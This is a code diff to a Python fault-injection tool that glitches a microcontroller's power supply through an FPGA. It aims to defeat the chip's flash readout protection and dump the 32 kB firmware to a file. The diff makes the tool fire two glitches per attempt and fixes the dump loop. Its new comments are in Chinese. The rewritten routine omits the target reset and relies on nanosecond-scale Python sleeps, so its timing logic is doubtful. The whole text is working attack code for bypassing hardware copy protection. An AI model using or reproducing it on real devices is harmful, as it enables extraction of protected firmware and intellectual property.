@@ -224,7 +224,7 @@ class Glitcher():
         with open(DUMP_FILE, "wb") as f:
 
             # read all 32 kB of flash memory
-            for i in range(1023):
+            for i in range(1024):
                 # first send "OK" to the target device
                 resp = self.send_target_command(OK, 1, True, b"\r\n")
 
@@ -242,90 +242,60 @@ class Glitcher():
         print(fg.li_white + "[*] Dumped memory written to '{}'".format(DUMP_FILE) + fg.rs)
 
     def run(self):
-        """Run the glitching process with the current configuration"""
-
-        # # reset target
-        # self.reset_target()
-        #
-        # # read and show the UID of the target device
-        # print(fg.li_white + "[*] Read target device UID" + fg.rs)
-        # resp = self.send_target_command(b"N", 4, True, b"\r\n")
-        #
-        # if resp[0] == b"0" and len(resp) == 5:
-        #     uid = "{} {} {} {}".format(resp[4].decode("ascii"), resp[3].decode("ascii"), resp[2].decode("ascii"), resp[1].decode("ascii"))
-        # else:
-        #     uid = "<unknown>"
-        #     print(fg.li_red + "[-] Could not read target device UID" + fg.rs)
-        #
-        # # read part identification number
-        # print(fg.li_white + "[*] Read target device part ID" + fg.rs)
-        # resp = self.send_target_command(b"J", 1, True, b"\r\n")
-        #
-        # if resp[0] == b"0":
-        #     part_id = "{}".format(resp[1].decode("ascii"))
-        # else:
-        #     part_id = "<unknown>"
-        #     print(fg.li_red + "[-] Could not read target part ID" + fg.rs)
-        #
-        # # show target device info
-        # print(fg.li_white + "[*] Target device info:\n" +
-        #         "    UID:                        {}\n".format(uid) +
-        #         "    Part identification number: {}".format(part_id))
-        #
-        # print(fg.li_white + "[*] Press <ENTER> to start the glitching process" + fg.rs)
-        # input()
-
-        # measure the time
+        """Run the glitching process with two consecutive glitches per attempt"""
+    
         start_time = datetime.now()
-
+    
+        # 假设 FPGA 时钟是 100 MHz → 10 ns/clk
+        CLK_PERIOD_S = 10e-9
+        MARGIN_S     = 1e-6  # 加点额外时间，确保脉冲结束
+    
         for offset in range(self.start_offset, self.end_offset, self.offset_step):
-            # duration in 10 ns increments
             for duration in range(self.start_duration, self.end_duration, self.duration_step):
-                # better test more than once
-                for i in range(self.retries):
-
-                    # set glitch config
-                    print(fg.li_white + "[*] Set glitch configuration ({},{})".format(offset, duration) + fg.rs)
+                for attempt in range(self.retries):
+    
+                    print(fg.li_white +
+                          f"[*] Test offset={offset}, duration={duration}, attempt={attempt+1}/{self.retries}"
+                          + fg.rs)
+    
+                    # 1) 配置 offset/duration
                     self.set_glitch_offset(offset)
                     self.set_glitch_duration(duration)
-
-                    # start glitch (start the offset counter)
+    
+                    # 2) 第一次 glitch：offset 周期后拉低电源
                     self.start_glitch()
-
-                    # reset target device
-                    self.reset_target()
-
-                    # synchronize with target
+                    # 等待 (offset + duration) 个周期 + margin
+                    sleep((offset + duration) * CLK_PERIOD_S + MARGIN_S)
+    
+                    # 3) 第二次 glitch：马上再来一次
+                    # 注意：FPGA 逻辑里 start_glitch 再次会重置计数器并重新计时
+                    self.start_glitch()
+                    sleep((offset + duration) * CLK_PERIOD_S + MARGIN_S)
+    
+                    # 4) 等待目标跑到 bootloader，同步波特率
                     if not self.synchronize():
-                        print(fg.li_red + "[-] Error during sychronisation" + fg.rs)
+                        print(fg.li_red + "[-] Synchronization failed, retrying..." + fg.rs)
                         continue
-
-                    # read flash memory address
-                    resp = self.send_target_command(READ_FLASH_CHECK, 1, True, b"\r\n")
-
-                    if resp[0] == b"0":
-                        # measure the time again
+    
+                    # 5) 发送读 flash 检查命令
+                    resp = self.send_target_command(READ_FLASH_CHECK, 1)
+                    if isinstance(resp, list) and resp[0] == b"0":
                         end_time = datetime.now()
-
-                        print(ef.bold + fg.green + "[*] Glitching success!\n"
-                                "    Bypassed the readout protection with the following glitch parameters:\n"
-                                "        offset   = {}\n        duration = {}\n".format(offset, duration) +
-                                "    Time to find this glitch: {}".format(end_time - start_time) + fg.rs)
-
-                        # save successful glitching configuration in file
-                        config = "{},{},{},{}\n".format(offset, duration, resp[0], resp[1])
+                        print(ef.bold + fg.green +
+                              "[*] Glitch success!\n"
+                              f"    offset={offset}, duration={duration}\n"
+                              f"    elapsed: {end_time - start_time}"
+                              + fg.rs)
+    
+                        # 记录并 dump
                         with open(RESULTS_FILE, "a") as f:
-                            f.write(config)
-
-                        # dump memory
-                        print(fg.li_white + "[*] Dumping the flash memory ..." + fg.rs)
+                            f.write(f"{offset},{duration},0,{resp[1].decode()}\n")
                         self.dump_memory()
-
                         return True
-
-                    elif resp[0] != b"19":
-                        print(fg.li_red + "[?] Unexpected response: {}".format(resp) + fg.rs)
-
+    
+                    elif isinstance(resp, list) and resp[0] != b"19":
+                        print(fg.li_red + f"[?] Unexpected response: {resp}" + fg.rs)
+    
         return False
 
 
